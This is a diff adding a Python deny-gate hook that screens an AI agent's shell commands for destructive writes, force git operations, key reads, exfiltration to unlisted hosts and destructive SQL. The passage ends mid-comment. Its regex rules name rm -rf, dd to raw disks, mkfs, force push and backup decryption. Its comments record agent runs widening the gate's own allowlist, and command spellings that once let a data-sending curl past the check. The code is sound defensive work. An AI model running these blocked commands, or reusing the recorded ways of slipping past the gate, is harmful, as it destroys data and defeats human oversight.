@@ -1,0 +1,2591 @@
+#!/usr/bin/env python3
+"""guard-unattended.py — the PreToolUse deny gate (idea-bank #32, second job).
+
+WHY THIS EXISTS. Everything else that constrains a session in this system is
+compliance-dependent: doctrine, taught rules, the compiled-rules recitation, the
+writing-lint gate. All of them work only if the session chooses to obey. On
+2026-08-02 an audit found ten claims relayed as verified that were not, which is
+what compliance-dependent control looks like when it fails. A hook is the only
+mechanism here the model cannot reason its way around, because the harness runs
+it, not the model.
+
+WHAT IT BLOCKS. Five classes that are never correct for a session to do on its
+own, unattended or not:
+  1. Destructive filesystem writes outside the sanctioned scratch zones.
+  2. History-rewriting or force git operations.
+  3. Reads of private key material.
+  4. Network sends to hosts outside the known set (the exfiltration guard).
+  5. Destructive SQL (DROP / TRUNCATE / unqualified DELETE or UPDATE).
+
+WHAT IT DELIBERATELY DOES NOT BLOCK. Ordinary database WRITES. Step 1 of the
+nightly chain is `cadence_engine.py --apply`, which writes by design. A naive
+"no writes when unattended" rule would kill the chain at 2am. The distinction
+this gate draws is destructive-or-exfiltrating, never write-versus-read.
+
+THE NIGHTLY CHAIN IS EXPLICITLY SAFE. Its command string is
+`cd ~/carr-system && ./bin/nightly.sh >/dev/null 2>&1; echo "direct script exit=$?"`
+and it carries a persisted permission approval that must stay byte-identical.
+It matches no pattern below. It is also allowlisted by exact string as a second
+belt, so a future pattern cannot accidentally catch it.
+
+KNOWN LIMIT, STATED HONESTLY. This sees the command the SESSION issues, not what
+a script does internally. `nightly.sh` runs git, pg_dump and R2 uploads inside
+itself and this gate never sees them. That is the correct scope: the threat model
+is a session taking a destructive action, not the reviewed scripts in this repo.
+
+FAILS OPEN, ON PURPOSE. Any internal error allows the call. A gate that wedges
+the 2am chain costs more than the marginal safety of failing closed, on a
+single-operator machine that is not a hostile environment. Every allow-on-error
+is logged so a silently-degraded gate is still discoverable.
+
+DISABLE FAST: remove the hooks block from settings.json, or `chmod -x` this file
+(a non-executable hook errors, and this gate fails open).
+"""
+
+import json
+from datetime import datetime, timezone
+import ipaddress
+import os
+import re
+import shlex
+import subprocess
+import sys
+import tempfile
+from urllib.parse import urlsplit
+
+# The shared "tell a command apart from the prose it carries" helper, already
+# used by the writer and staging-attribution gates. Imported rather than copied
+# for the reason its own docstring gives: two copies of "what counts as inert"
+# drift silently, because each copy still passes its own tests.
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+from cmd_text import SHELL_BOUNDARIES, shell_operands, shell_tokens, strip_inert_text  # noqa: E402
+# Shared with hooks/record-home-gate.py, which refuses the FILE-TOOL spelling of
+# the same write. One memory, so a record refused through either door is
+# recognised at the other (rule 76a53dfe).
+from refused_content import REFUSAL, remember_refusal, was_refused  # noqa: E402
+
+
+def heredoc_body(cmd):
+    """The text a heredoc feeds to a program — the payload of a shell write.
+
+    Only the body: the command around it is the delivery mechanism, and the
+    rule is about the RECORD being hidden, not about how it travelled.
+    """
+    match = re.search(r"<<-?\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1\n(.*?)\n\s*\2\s*$",
+                      cmd or "", re.S | re.M)
+    return match.group(3) if match else ""
+
+REPO = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))
+try:                                    # telemetry only — never load-bearing
+    import hook_meter
+    LOG = hook_meter.guard_log_path(REPO)
+except Exception:                       # a missing meter must not change a verdict
+    LOG = os.path.join(REPO, "out", "hook-guard.log")
+
+# The nightly chain, verbatim. Belt and braces: it matches nothing below, and it
+# is also allowlisted so it can never be caught by a pattern added later.
+ALLOW_EXACT = {
+    'cd ~/carr-system && ./bin/nightly.sh >/dev/null 2>&1; echo "direct script exit=$?"',
+    "cd ~/carr-system && ./run.sh health",
+}
+
+# Paths a session may freely destroy things inside.
+SAFE_ZONES = (
+    "/private/tmp/", "/tmp/", "/var/folders/",
+    "carr-system/out/", "carr-system/_to_delete/", "_to_delete/",
+    "scratchpad", "Graph.tmp",
+)
+
+# Hosts this system legitimately talks to.
+KNOWN_HOSTS = (
+    # Microsoft identity + Graph: the carr.us mailbox is Microsoft 365, and the
+    # draft transport talks to these two and nothing else on Microsoft's side.
+    "login.microsoftonline.com", "graph.microsoft.com", "outlook.office365.com",
+    # The staging Worker's ONLY address. It is deliberately workers.dev and not a
+    # custom domain: on 2026-08-13 a staging deploy without `routes = []`
+    # inherited all three production custom domains and served api.doctorcre.com
+    # from the empty staging database for about two minutes. Staging now attaches
+    # to workers.dev alone, which the deployment configuration declares before
+    # any non-production deploy — so this hostname is exactly how a session
+    # reaches staging WITHOUT touching production, and blocking it pushes anyone
+    # verifying a staging deploy toward the production URL instead. That is the
+    # confusion the incident was made of, which is why it is listed here.
+    "carr-mcp-staging.joe-bookout-carr-us.workers.dev",
+    # Staging app Worker, CARR-owned, no client data.
+    "doctorcre-app-staging.joe-bookout-carr-us.workers.dev",
+    # nodejs.org: the official Node.js download host, and node is INFRASTRUCTURE
+    # for this repo rather than a research read — mcp-server/local-verb.mjs is the
+    # only route from a terminal or an unattended job to the record verbs, and
+    # ops/ci.sh needs it too. Dell's Mac has no node, no Homebrew, and no sudo to
+    # install one, so both were simply dead there: `./run.sh call` exits with
+    # FileNotFoundError 'node' and local CI cannot run at all. This is the same
+    # class as console.neon.tech above — a fixed host somebody decides once — and
+    # the file's own header reserves the CODE list for exactly that, keeping the
+    # record-derived half for client practice domains. Downloads are checksum
+    # verified against the SHASUMS256.txt published beside the tarball.
+    # registry.npmjs.org travels with it: node alone does not run local-verb.mjs,
+    # which imports @neondatabase/serverless and the MCP SDK. Installs go through
+    # `npm ci` against mcp-server/package-lock.json, so every package is pinned and
+    # integrity-checked by npm from hashes already committed to this repo — the
+    # lockfile is the review, not the network call.
+    "nodejs.org", "registry.npmjs.org",
+    # DoctorCRE's production app is CARR-owned infrastructure; release checks
+    # and the signed-out progress-board check read this exact host.
+    "api.doctorcre.com", "app.doctorcre.com",
+    "api.anthropic.com", "console.neon.tech",
+    # OpenRouter (Joe 2026-10-06): his own pay-per-token model router, used as a
+    # Claude Code ANTHROPIC_BASE_URL so builders can run GLM or DeepSeek models
+    # inside this harness, with these hooks still on, when subscriptions run dry.
+    "openrouter.ai",
+    "neon.tech", "cloudflareapi.com", "cloudflare.com", "r2.cloudflarestorage.com",
+    "googleapis.com", "github.com", "api.github.com", "hc-ping.com",
+    # Dot relay uses the Slack Web API; its user token stays in ~/.hermes/.env.
+    # This host is fixed infrastructure, not a record-derived practice domain.
+    "slack.com",
+    "npiregistry.cms.hhs.gov", "download.cms.gov",
+    # raw.githubusercontent.com: loop #163 named its absence as the gap forcing
+    # the gh-api workaround for plain changelog reads. Added 2026-08-06 with the
+    # WebFetch widening.
+    "raw.githubusercontent.com",
+    # Research-read hosts, added 2026-08-06 night on Joe's direct order to read
+    # the architecture-research shortlist ("read each one 1 at a time") — the
+    # first legitimate tuning of the widened WebFetch gate, hours after it
+    # shipped. All are read-only documentation/paper hosts.
+    # claude.com sits beside anthropic.com for the same reason and the same
+    # owner, and its absence had a daily cost: the standard Claude Code
+    # attribution line links there, so every `gh pr create` carrying it was
+    # refused as an unrecognised host. That happened three times in one session
+    # on 2026-08-14, each time to a real PR. The available workaround is to
+    # strip the link, which quietly drops the attribution it exists to give.
+    "arxiv.org", "anthropic.com", "claude.com", "humanlayer.dev", "mem0.ai",
+    "langchain.com", "emergentmind.com",
+    # Official vendor announcements and developer/API documentation.
+    "openai.com", "developers.openai.com", "platform.openai.com",
+    # blotato.io: the media-upload backend of the ALREADY-SANCTIONED Blotato
+    # connector. Its create-post tool takes public mediaUrls, and the only way
+    # to get a local PNG there is the presigned PUT its own tool description
+    # prescribes ("Use curl ... --data-binary"). The network gate landed
+    # 2026-08-02 (ea2c78c) and this host was never listed, which SILENTLY BROKE
+    # the image half of `social-batch-weekly` — the 7/31 batch had uploaded 18
+    # graphics fine, and the 2026-08-07 run was the first weekly batch after the
+    # gate and hit the wall on its first upload. Restored here rather than
+    # shipping a batch with no graphics, which would fail the mandatory
+    # format-rotation gate in social-media-workflow.md. Scope is narrow by
+    # construction: the PUT targets a short-lived presigned URL this session
+    # minted seconds earlier through the connector, and carries a PNG we just
+    # rendered. Added 2026-08-07 by the social-batch-weekly run; flagged to Joe
+    # in that run's output because a scheduled job widening a security gate is
+    # exactly the kind of change that should not pass unannounced.
+    "blotato.io",
+    # backend.blotato.com: the POSTING API host of the same already-sanctioned
+    # Blotato connector whose media host sits on the line above. Added
+    # 2026-08-21 on Joe's explicit in-session approval, by the
+    # social-batch-weekly run, after the MCP connector that every batch through
+    # 2026-08-14 used vanished from the runtime — leaving
+    # claude-tree/skills/social-media-manager/scripts/blotato.sh, which this
+    # repo already carries and which calls https://backend.blotato.com/v2, as
+    # the only remaining route. That route is BETTER for an unattended run than
+    # the connector was: BLOTATO_API_KEY is a stored env var in ~/.zprofile, so
+    # it satisfies the rule that no unattended path may depend on an
+    # interactive credential.
+    #
+    # SCOPE, stated because an allowlist entry is a standing permission:
+    # scheduling review-drafts that Joe approves inside Blotato before anything
+    # publishes, and READING the queue. The read half is why this was urgent —
+    # the week-of-8/10 batch was verified as scheduled and then silently
+    # vanished from the queue, and with no route to Blotato nobody could see
+    # that it had happened.
+    "backend.blotato.com",
+    # huggingface.co: whisper.cpp model downloads for the dictation rig
+    # (ggml-large-v3-turbo). Added 2026-08-07 on Joe's explicit go in the
+    # dictation-rig build session; read-only model fetches into ~/.cache.
+    "huggingface.co",
+    # api.elevenlabs.io: Doc's production renderer. build-voice-corpus.py exists
+    # for exactly this ("once ElevenLabs does production rendering, render speed
+    # stops constraining the SOURCE material", Joe 2026-08-08) and the 193-line
+    # corpus was built to be uploaded there. The guard blocked the host outright,
+    # so the step the corpus was made for could not run. Added 2026-08-10 while
+    # Joe was live in-session ("we can go through eleven labs testing with Doc's
+    # voice"), and flagged to him in that turn rather than passing unannounced —
+    # widening a security gate is not a silent act.
+    #
+    # SCOPE, stated because an allowlist entry is a standing permission: this is
+    # the API host for voice creation and text-to-speech renders of a voice we
+    # designed. Doc has no real-person referent (voice doctrine section 3), so
+    # nothing here is a person's voice. Audio uploaded is synthetic Doc, raw and
+    # pre-mastering by design. NOTE FOR ANY FUTURE READER: the same doctrine
+    # section warns ElevenLabs retains a perpetual licence over the underlying
+    # voice model, so exclusivity of Doc as a brand asset is an OPEN question,
+    # not one this entry settles.
+    "api.elevenlabs.io", "elevenlabs.io",
+    # x.com / twitter.com: X retrieval is standing doctrine (rule 57d13061,
+    # Grok-first as of 2026-08-07) and Joe hands sessions x.com links directly.
+    # The guard was blocking the Grok CLI invocation itself because the link
+    # appears in the command text. Read-only retrieval; Claude still writes all
+    # content and nothing posts to X from a session. Added 2026-08-07 while Joe
+    # was live in-session ("study this article for our system").
+    "x.com", "twitter.com",
+    # ── Client-verification sources, added 2026-08-07 on Joe's order after the
+    # weekly deal-history research slice ran half-blind. That run could reach
+    # NPPES and nothing else: no entity filing, no licence status, no primary
+    # source of any kind. Four of fifteen records were filed found:false partly
+    # because the registry that would have settled them was unreachable, and
+    # every website fact in the run rests on a search-engine summary — which is
+    # precisely what rule 94806da2 says not to let stand.
+    #
+    # All read-only public-record lookups. Each hostname was verified live
+    # before being added rather than recalled: a guessed host in an allowlist is
+    # dead weight at best, and at worst names a domain someone else can register.
+    #
+    # State entity registries — the "is this a real company and what is its
+    # legal name" question that every client identity check runs through.
+    "sunbiz.org",              # FL Division of Corporations (search.sunbiz.org)
+    "dos.fl.gov",              # FL Dept of State, the Sunbiz parent
+    "arc-sos.state.al.us",     # AL SOS entity search (legacy CGI, NOT under alabama.gov)
+    # Licensing boards. alabama.gov is deliberately the whole domain rather than
+    # one host per board: every AL board lives on it (chiro., optometry.,
+    # asbvme., sos., licensesearch., inform.) and CARR's verticals will want
+    # boards nobody has needed yet. One entry beats a dozen that drift apart.
+    "alabama.gov",
+    "dentalboard.org",         # Board of Dental Examiners of Alabama (a .org, not a .gov)
+    # The AL dental board hosts its actual licensee lookup on a third-party
+    # vendor, so dentalboard.org alone does NOT make dental licence checks work.
+    # Scoped to the board's own host rather than igovsolution.net, which serves
+    # many states' boards — this grant buys Alabama and nothing else. Widen only
+    # if another state's board is ever needed. Joe's go, 2026-08-07.
+    "bdeal.igovsolution.net",
+    "albme.gov",               # AL Board of Medical Examiners
+    # Alabama's official e-government portal (state contract, Tyler/NIC). Added
+    # 2026-08-07 on Joe's go, one exchange after the rest of this block, because
+    # verifying the block found the gap: the AL CHIROPRACTIC board publishes no
+    # lookup on chiro.alabama.gov and routes to this portal instead, and it is
+    # the one AL board absent from the unified licensesearch.alabama.gov (that
+    # path returns HTTP 500). Without this entry a chiropractor's licence cannot
+    # be verified in Alabama at all — the live gap behind the C-130 Nina Calloway
+    # npi:found=false row of 2026-08-07.
+    #
+    # UNLIKE the igovsolution entry above, this one CANNOT be narrowed: the
+    # boards sit on PATHS of the apex domain (/asbce/, /sos/) rather than on
+    # per-board subdomains, and this matcher tests hosts, not paths. So the
+    # grant is the whole portal or nothing. Accepted as the same trust class as
+    # alabama.gov — it is the state's own contracted portal — and noted here
+    # plainly rather than left to look like a deliberately loose entry.
+    "alabamainteractive.org",
+    "doh.state.fl.us",         # FL DOH MQA licence search (appsmqa./mqa-internet./mqa-vo.)
+    "flhealthsource.gov",      # FL DOH consumer-facing licence portal
+    # Professional directories, ranked BELOW the registries above: ada.org is an
+    # association roster and healthgrades.com is a commercial aggregator
+    # carrying stale and advertised entries. Corroboration only, never the sole
+    # source for an identity claim.
+    "ada.org",
+    "healthgrades.com",
+    # NOT added, and deliberately: individual practice websites. They are the
+    # largest remaining gap in client verification and an allowlist cannot close
+    # it — every client has a different domain, so the list would have to grow
+    # by one entry per client forever. linkedin.com is also omitted: it blocks
+    # automated fetches behind a login wall, so listing it would buy nothing.
+    #
+    # hermes-agent.nousresearch.com: the vendor host serving the Hermes Agent
+    # installer and its documentation. Hermes is the runtime the 2026-08-12
+    # frontier council cleared for an R0 evaluation (decision 94c0206f,
+    # "Present Hermes on Nous Portal Cloud as a constrained council evaluation
+    # candidate") — read-only and synthetic, with live CARR data held behind a
+    # second Joe decision. The install was blocked here on 2026-08-16 and Joe
+    # approved this entry in session the same day, after being told the host,
+    # the installer, and that a gate edit was the price.
+    #
+    # SCOPE, stated because an allowlist entry is a standing permission: this
+    # buys the installer download and the docs on that host. It buys Hermes
+    # NOTHING inside CARR. The R0 pilot profile and its three permitted read
+    # verbs are unbuilt planning fixtures in phase0/, so there is nothing for a
+    # Hermes runtime to connect to, and connecting it to the live record layer
+    # under Joe's own profile is the thing all three council seats refused. A
+    # future session finding Hermes reaching CARR has found a defect, not a
+    # permission granted here. api.x.ai is deliberately absent: the sanctioned
+    # sign-in is browser OAuth against Joe's own subscription, which runs in his
+    # browser rather than through a session's network calls.
+    "hermes-agent.nousresearch.com",
+    # tailc8cc93.ts.net: Joe's own private Tailscale tailnet (his MagicDNS
+    # domain), reachable only from devices signed into or shared onto that
+    # tailnet — never public. Added 2026-09-23 so his Mac Studio's local model
+    # server ("flash-next", ds4-server on 127.0.0.1:8000, served tailnet-wide
+    # via `tailscale serve` at http://mac-studio.tailc8cc93.ts.net:8000) is
+    # reachable from his other devices, starting with a test from his MacBook
+    # (joes-macbook-pro.tailc8cc93.ts.net). host_allowlisted does suffix
+    # matching, so this one entry covers every device name on HIS tailnet, and
+    # SSH between his own Macs. Deliberately scoped to this one tailnet, not
+    # the broad `ts.net` suffix: someone else's tailnet must stay blocked.
+    "tailc8cc93.ts.net",
+    # census.gov: the U.S. Census Bureau's own federal domain. Added 2026-09-25
+    # on Joe's explicit in-chat approval to download two public files for the
+    # J302 Safe Harbor census tables behind the heat-map privacy builder: the
+    # 2020 county reference file and the 2020 DHC ZCTA population. The guard
+    # was refusing both www2.census.gov and api.census.gov.
+    #
+    # SCOPE, stated because an allowlist entry is a standing permission: this is
+    # read-only public statistical data from one federal owner, the same trust
+    # class as download.cms.gov and alabama.gov above. It is the whole domain
+    # rather than the two hosts because the job needs two subdomains of the same
+    # owner and the Bureau spreads one dataset across several of them. The
+    # anchored suffix match covers census.gov and *.census.gov only: lookalikes
+    # such as census.gov.<other> and notcensus.gov stay blocked, and
+    # ops/guard-selftest.py asserts both.
+    "census.gov",
+)
+
+# ── render-write protection over Bash (2026-08-06, Joe: "Fix both now") ──────
+# The record-home gate denies Edit/Write on generated renders, but an ordinary
+# shell redirect walked around it: the #214 audit proved `echo >> open-loops.md`
+# ALLOWED while Edit on the same file was DENIED. This closes the second door.
+# The protected-path list is record-home-gate's own (parsed live from
+# exporters/targets.py) — one list, two doors. BEST-EFFORT PARSER, stated
+# plainly: it catches the ordinary write shapes the audit demonstrated
+# (>, >>, tee, cp/mv/rsync targets, sed -i, truncate, python open(...,'w')).
+# It does not chase adversarial obfuscation; the gate degrades open on its own
+# errors like the rest of this file.
+
+def _vault_spellings():
+    """The primary machine's two literal spellings, PLUS whatever vault actually
+    exists here. Additive on purpose (2026-08-10 audit): the hardcodedは
+    pair is kept verbatim so this machine's matching cannot regress, while a second
+    machine stops running a vault guard that matches no path it owns."""
+    home = os.path.expanduser("~")
+    fixed = (
+        home + "/Library/CloudStorage/GoogleDrive-joe.bookout.carr.us@gmail.com/My Drive/CARR AI/",
+        home + "/My Drive/CARR AI/",
+    )
+    try:
+        from gate_paths import vault_roots
+        return tuple(dict.fromkeys(fixed + vault_roots()))
+    except Exception:
+        return fixed          # degrade open, like the rest of this file
+
+
+_VAULT_SPELLINGS = _vault_spellings()
+
+_render_paths_cache = None
+
+
+def _protected_abs_paths():
+    """Absolute protected render paths under BOTH vault spellings, from
+    record-home-gate's generated_paths(). Cached per invocation; [] on any
+    error (fail open, logged by caller)."""
+    global _render_paths_cache
+    if _render_paths_cache is not None:
+        return _render_paths_cache
+    try:
+        import importlib.util
+        gate_py = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                               "record-home-gate.py")
+        spec = importlib.util.spec_from_file_location("_rhg", gate_py)
+        g = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(g)
+        exact, dirs = g.generated_paths()
+        paths = []
+        for rel in list(exact):
+            for v in _VAULT_SPELLINGS:
+                paths.append(v + rel)
+        _render_paths_cache = (paths, [v + d.rstrip("/") + "/" for d in dirs for v in _VAULT_SPELLINGS])
+    except Exception:
+        _render_paths_cache = ([], [])
+    return _render_paths_cache
+
+
+# sed -i: any protected path inside a `sed -i` clause IS the in-place write
+# target, so the pattern accepts anything between -i and the path short of a
+# clause separator (macOS sed carries a backup-suffix arg the first version
+# of this regex missed).
+_WRITE_BEFORE_CTX = re.compile(
+    r"(>>?|\btee(\s+-a)?|\bsed\s+-i[^|;&]*|\btruncate\b[^|;&]*)\s*[\"']?$")
+
+
+def render_write_target(cmd):
+    """Reason string when the command writes onto a protected render, else None."""
+    exact, gen_dirs = _protected_abs_paths()
+    if not exact and not gen_dirs:
+        return None
+    hits = [p for p in exact if p in cmd]
+    hits += [d for d in gen_dirs if d in cmd]
+    if not hits:
+        return None
+    for p in hits:
+        idx = 0
+        while True:
+            idx = cmd.find(p, idx)
+            if idx < 0:
+                break
+            before = cmd[max(0, idx - 60):idx]
+            if _WRITE_BEFORE_CTX.search(before):
+                return (f"write onto a generated render via shell ({os.path.basename(p.rstrip('/'))}) — "
+                        f"renders are written by the exporter only; use the record verb instead "
+                        f"(blocked by the CARR guard, second door of record-home-gate)")
+            idx += len(p)
+    # cp/mv/rsync: protected path as the DESTINATION (last path argument of the clause)
+    for clause in re.split(r"[;&|]", cmd):
+        toks = clause.strip().split()
+        if not toks:
+            continue
+        if toks[0] in ("cp", "mv", "rsync"):
+            tail = clause.strip()
+            for p in hits:
+                if tail.rstrip("\"' ").endswith(p.rstrip("/")):
+                    return (f"{toks[0]} onto a generated render ({os.path.basename(p.rstrip('/'))}) — "
+                            f"renders are written by the exporter only; use the record verb instead "
+                            f"(blocked by the CARR guard, second door of record-home-gate)")
+    # python inline write onto a protected path
+    for p in hits:
+        if re.search(r"open\(\s*[\"']" + re.escape(p) + r"[\"']\s*,\s*[\"'][wa]", cmd):
+            return (f"python write onto a generated render ({os.path.basename(p)}) — "
+                    f"use the record verb instead (blocked by the CARR guard)")
+    return None
+
+# Vault .md paths in a shell command: vault spelling + relative tail up to a
+# shell metachar/quote. Case-insensitive match would be wrong (APFS is
+# case-insensitive but the manifest compares normalized real paths; the Write
+# hook is the primary door — this door catches the shell walk-around).
+_VAULT_MD_RE = None
+
+
+def vault_md_write_target(cmd):
+    """PHASE 0 (doctrine-store build, decision 82a2fb62): the Bash door of the
+    vault-wide .md deny-by-default. Same manifest as record-home-gate — one
+    module, hooks/md_manifest.py — so the two doors cannot drift (rule a8c55a47).
+    Renders are caught earlier by render_write_target with a sharper message."""
+    global _VAULT_MD_RE
+    try:
+        if _VAULT_MD_RE is None:
+            alts = "|".join(re.escape(v) for v in _VAULT_SPELLINGS)
+            _VAULT_MD_RE = re.compile(r"(" + alts + r")([^\"'|;&<>]+?\.md)\b")
+        hits = [(m.start(), m.group(2)) for m in _VAULT_MD_RE.finditer(cmd)]
+        if not hits:
+            return None
+        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+        from md_manifest import md_write_verdict
+        for idx, rel in hits:
+            verdict = md_write_verdict(rel.strip())
+            if not verdict:
+                continue
+            before = cmd[max(0, idx - 60):idx]
+            written = bool(_WRITE_BEFORE_CTX.search(before))
+            if not written:
+                # cp/mv/rsync destination, or a python open(..., "w"/"a")
+                for clause in re.split(r"[;&|]", cmd):
+                    toks = clause.strip().split()
+                    if toks and toks[0] in ("cp", "mv", "rsync") \
+                            and clause.rstrip("\"' ").endswith(rel):
+                        written = True
+                        break
+                if re.search(r"open\(\s*[\"'][^\"']*" + re.escape(rel) + r"[\"']\s*,\s*[\"'][wa]",
+                             cmd):
+                    written = True
+            if written:
+                return (f"shell write onto vault markdown — {verdict} "
+                        f"(blocked by the CARR guard, Bash door of the Phase 0 .md write-block)")
+        return None
+    except Exception:
+        return None                                   # fail open, same as siblings
+
+
+def corpus_render_write_target(cmd):
+    """The Bash door of the corpus-render write-block (2026-08-10, Joe's
+    instruction after the nightly chain failed on eight Drive-side edits).
+    Same deny set as the Write/Edit door — one module, hooks/corpus_renders.py —
+    so the two doors cannot drift apart (rule a8c55a47: a manual path and an
+    automated path that do the same job must be the same code).
+
+    `corpus-sync.py` itself is exempt and must be: it is the sanctioned writer
+    of every one of these files. It never names them literally, so the exemption
+    is belt-and-braces rather than load-bearing."""
+    try:
+        if "corpus-sync.py" in cmd:
+            return None
+        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+        from corpus_renders import paths_in_command, verdict
+        hits = paths_in_command(cmd)
+        if not hits:
+            return None
+        for spelling, real in hits.items():
+            written = False
+            idx = 0
+            while True:
+                idx = cmd.find(spelling, idx)
+                if idx < 0:
+                    break
+                if _WRITE_BEFORE_CTX.search(cmd[max(0, idx - 60):idx]):
+                    written = True
+                    break
+                idx += len(spelling)
+            if not written:
+                for clause in re.split(r"[;&|]", cmd):
+                    toks = clause.strip().split()
+                    if toks and toks[0] in ("cp", "mv", "rsync") \
+                            and clause.rstrip("\"' ").endswith(spelling):
+                        written = True
+                        break
+            if not written and re.search(
+                    r"open\(\s*[\"'][^\"']*" + re.escape(os.path.basename(spelling))
+                    + r"[\"']\s*,\s*[\"'][wa]", cmd):
+                written = True
+            if written:
+                return (f"shell write onto a corpus render — {verdict(real, 'this command')} "
+                        f"(blocked by the CARR guard, Bash door of the corpus-render block)")
+        return None
+    except Exception:
+        return None                                   # fail open, same as siblings
+
+
+# WIDENED 2026-08-14 BY A SWEEP, after the raw-device rule was found missing the
+# ordinary spelling of its own command while somebody picked an example for an
+# unrelated fixture. Probing every rule against the real ways its command is
+# written turned up eight misses across four rules — and none of it had ever
+# surfaced, because no fixture asserted these rules FIRE. The suite tested the
+# allow side and the network side and took the destructive side on trust. A rule
+# with no fire-asserting test is indistinguishable from a rule that does not
+# work. ops/guard-selftest.py now pins each one.
+#
+# DEVICE FAMILIES STAY ENUMERATED, never a bare /dev/ match: /dev/null,
+# /dev/tty and /dev/stderr are everyday redirection targets, and refusing those
+# would break ordinary work within the hour.
+_DEV = r"/dev/(sd|disk|rdisk|nvme|vd|hd)"
+
+RULES = [
+    # 1. destructive filesystem
+    (re.compile(r"\brm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+)+", re.I), "recursive/forced delete"),
+    # `find ... -delete` removes exactly what rm -rf removes, one directory walk
+    # at a time, and was the only whole-tree delete this table did not see. It
+    # keeps the same safe-zone waiver as rm, so the routine scratch cleanup
+    # (`find <scratch> -name '*.pyc' -delete`) is unaffected.
+    (re.compile(r"\bfind\b[^|;&]*\s-delete\b", re.I), "recursive/forced delete"),
+    (re.compile(r"\b(shred|srm)\b", re.I), "secure delete"),
+    # Three ways to write a raw device, not one. The original pattern saw only
+    # shell redirection, so `dd of=<device>` — the form anyone actually reaches
+    # for, and the one in every disk-imaging guide — went straight through.
+    (re.compile(r">\s*" + _DEV, re.I), "raw device write"),
+    (re.compile(r"\bdd\b[^|;&]*\bof=" + _DEV, re.I), "raw device write"),
+    (re.compile(r"\btee\b[^|;&]*\s" + _DEV, re.I), "raw device write"),
+    # newfs_* is the macOS spelling of mkfs, and partitionDisk destroys just as
+    # completely as eraseDisk while reading like a layout change.
+    (re.compile(r"\bmkfs\b|\bnewfs_\w+\b|\bdiskutil\s+(erase|partitionDisk|reformat)", re.I),
+     "filesystem format"),
+    # 2. git history rewrite
+    # A leading + on a refspec IS a force push — the same overwrite with none of
+    # the flags this rule was watching for.
+    (re.compile(r"git\s+push\b[^|;&]*(--force\b|--force-with-lease\b|\s-f\b|\s\+\S+:)", re.I),
+     "force push"),
+    (re.compile(r"git\s+reset\s+--hard\b", re.I), "hard reset"),
+    (re.compile(r"git\s+(filter-repo|filter-branch)\b", re.I), "history rewrite"),
+    (re.compile(r"git\s+clean\s+-[a-zA-Z]*f", re.I), "forced clean"),
+    # 2b. `--no-verify` / core.hooksPath REDESIGNED OUT (2026-09-24, Opus
+    # review, bypass audit C38). These were shell-text regexes over a
+    # locally-run accident-stopper hook (ops/githooks/pre-commit itself says
+    # so: "not a security control: anyone can bypass it with --no-verify").
+    # Hosted CI is what actually
+    # stops a bypass from reaching main — so this file no longer chases every
+    # spelling of a local-only escape hatch. Broad add is different: it is
+    # covered below as a dedicated, argument-aware function rather than a
+    # regex, because AGENTS.md makes a specific, checkable promise about it
+    # (see broad_add_reason()).
+    # 3b. THE REAL EXPOSURE THE EXTENSION WAS STANDING IN FOR, now named directly.
+    # Handling a .age file is harmless; DECRYPTING one spills production PII in
+    # cleartext. So the dangerous verb is blocked instead of the file type, which
+    # is both tighter and less obstructive than what it replaces.
+    # bin/restore-rehearse.sh is unaffected: it decrypts INSIDE the script, into a
+    # mode-700 mktemp outside the repo, and shreds it on every exit path including
+    # a Ctrl-C. The gate sees `./run.sh restore-rehearse ...`, never the age call.
+    # LIMIT, stated rather than pretended away: this matches the flags real usage
+    # spells out (-d, --decrypt, -i, --identity). It does not chase bundled short
+    # flags or obfuscation, same as every other rule here.
+    (re.compile(r"\bage\s+[^|;&]*(--?d\b|--decrypt\b|--?i\b|--identity\b)", re.I),
+     "raw decrypt of an encrypted backup — production data in cleartext. Use "
+     "`./run.sh restore-rehearse --backup-run-id RUN --verify-only`, which handles the "
+     "key and shreds the plaintext"),
+    # 4. destructive SQL
+    (re.compile(r"\bdrop\s+(table|schema|database|view|index)\b", re.I), "DROP"),
+    (re.compile(r"\btruncate\s+(table\s+)?\w", re.I), "TRUNCATE"),
+    (re.compile(r'\bdelete\s+from\s+(?:[\w".]+)\s*(;|$)', re.I), "unqualified DELETE"),
+    (re.compile(r'\bupdate\s+[\w".]+\s+set\b(?![^;]*\bwhere\b)', re.I), "unqualified UPDATE"),
+]
+
+# ── IS THIS COMMAND ACTUALLY SENDING? (loop #283, fixed 2026-08-13) ───────────
+#
+# THE BUG THIS REPLACES, and it was a false positive that blocked real work every
+# time it fired. The old test was:
+#
+#     SEND_CTX = re.compile(r"\b(curl|wget|http|https)\b", re.I)
+#
+# `http` and `https` as bare words appear inside EVERY quoted URL, so any command
+# that merely MENTIONED a link was treated as a network send and then had to pass
+# every host in it through the allowlist. Found 2026-08-09 by the
+# linkedin-engagement-daily run: it assembled its own deliverable — open a local
+# file, concatenate strings, write it back — and was refused with "network send to
+# an unrecognised host (www.linkedin.com)". No network call was made or attempted.
+# That routine's own SOP mandates a permalink per item, so every run hit it, and
+# the x-reply run stores post links the same way.
+#
+# WHY NOT JUST ALLOWLIST linkedin.com. Because that widens REAL egress to fix a
+# case where no egress happens, and leaves every other URL-quoting file write
+# still broken. The loop names the right fix and this is it: decide from the
+# command's EXECUTABLE first, and only then look at hostnames.
+#
+# THE SENDER TEST. A sender name counts only as the EXECUTABLE a simple command
+# runs, optionally with a leading path. That is what keeps `https` in
+# `"see https://example.com"` from matching while `curl`, `/usr/bin/curl` and
+# `... | xargs curl` all still do. `http`/`https` REMAIN senders, because
+# httpie's client is literally named `http` and dropping it would open a real hole.
+#
+# WHAT "THE EXECUTABLE" MEANS is decided by normalising command position, not by
+# listing spellings (2026-10-08). The first version matched a sender only at the
+# start of a command or straight after a bare prefix word, so `X=1 curl -d ...`,
+# `env -i curl -d ...`, `env X=1 curl -d ...` and `timeout 5 curl -d ...` hid
+# the sender, and a data-sending curl to an unlisted host was ALLOWED; so were
+# the same sends inside `bash -c '...'`, `eval '...'` and after `then`/`do`.
+# Command position is now found the way the shell finds it (command_executables):
+#   - leading VAR=value assignments are skipped;
+#   - shell keywords that introduce a command (then, do, if, ! ...) are skipped;
